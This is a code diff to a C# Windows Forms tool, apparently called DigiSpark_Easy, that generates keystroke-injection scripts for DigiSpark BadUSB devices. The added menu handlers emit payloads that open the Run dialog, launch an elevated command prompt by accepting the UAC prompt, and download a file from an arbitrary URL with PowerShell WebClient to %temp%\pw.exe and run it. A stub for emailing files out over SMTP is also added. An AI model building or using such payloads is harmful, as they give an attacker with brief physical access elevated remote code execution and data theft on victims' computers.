@@ -13,8 +13,8 @@ namespace DigiSpark_Easy
 {
     public partial class FrmMain : Form
     {
-        String script = "";
-        ListViewItem item = new ListViewItem("Item1", 0);
+        //ListViewItem item = new ListViewItem("Item1", 0);
+        FrmSmtp frmsmtp = new FrmSmtp();
         public FrmMain()
         {
             InitializeComponent();
@@ -280,6 +280,50 @@ namespace DigiSpark_Easy
             {
                 item.SubItems[0].Text = txtIP.Text;
                 item.SubItems[1].Text = txtDNS.Text;
+            }*/
+        }
+
+        private void opción3ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            txtScript.Text += "DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);" + "\r\n" +
+                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
+                "DigiKeyboard.println(\"powershell Start/Process cmd /Verb runAs\");" + "\r\n" +
+                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
+                "DigiKeyboard.sendKeyStroke(KEY_LEFTARROW);" + "\r\n" +
+                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
+                "DigiKeyboard.sendKeyStroke(KEY_ENTER);" + "\r\n" +
+                "DigiKeyboard.delay(" + txtDelayDefault.Text + "); " + "\r\n";
+
+        }
+
+        private void descargarYEjecutarArchivoToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            FrmFicheroScript frmfichero = new FrmFicheroScript();
+            frmfichero.ShowDialog();
+            if (frmfichero.url!="")
+            {
+                txtScript.Text += "DigiKeyboard.println(\"powershell *new/object System.Net.WebClient(.DownloadFile*-" + frmfichero.url + "-,-%temp%&pw.exe-(<\");" + "\r\n" +
+                    "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
+                    "DigiKeyboard.println(\"pw.exe\")" + "\r\n" +
+                    "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n";
+            }
+
+        }
+
+        private void sMTPToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            frmsmtp.ShowDialog();
+        }
+
+        private void enviarArchivoPorCorreoToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            /*if (frmsmtp.correo=="" || frmsmtp.password=="")
+            {
+                MessageBox.Show("Primero tienes que configurar el servidor SMTP\n\rConfiguración-->SMTP");
+            }
+            else
+            {
+
             }*/
         }
     }
